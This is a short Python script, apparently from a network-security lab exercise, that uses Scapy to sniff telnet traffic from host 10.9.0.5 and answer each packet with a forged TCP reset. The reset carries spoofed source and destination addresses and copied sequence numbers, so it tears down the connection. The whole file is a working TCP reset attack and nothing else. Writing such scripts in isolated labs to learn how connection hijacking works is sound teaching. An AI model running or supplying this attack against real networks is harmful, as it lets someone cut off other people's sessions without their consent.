#!/usr/bin/env python3

from scapy.all import *
import subprocess


def reset_tcp(pkt):
	if pkt[TCP].flags != "R":
		ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
		tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="R", seq=pkt[TCP].ack, ack=pkt[TCP].seq)
		send(ip/tcp)


cmd = "ip a | grep 10.9.0.1 | awk '{print $7}'"
IFACE = subprocess.run(cmd, shell=True, check=True, universal_newlines=True, stdout=subprocess.PIPE).stdout.strip()

pkt = sniff(iface=IFACE, filter="src host 10.9.0.5 and tcp dst port 23", prn=reset_tcp)

